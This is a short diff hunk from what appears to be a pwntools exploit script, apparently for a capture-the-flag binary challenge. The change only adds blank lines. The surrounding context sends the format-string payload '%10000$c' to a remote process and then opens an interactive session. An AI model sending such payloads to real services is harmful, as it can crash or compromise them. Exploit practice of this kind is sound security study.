@@ -24,3 +24,5 @@ r.readline()
 r.readline()
 r.sendline(b'%10000$c')
 r.interactive()
+
+
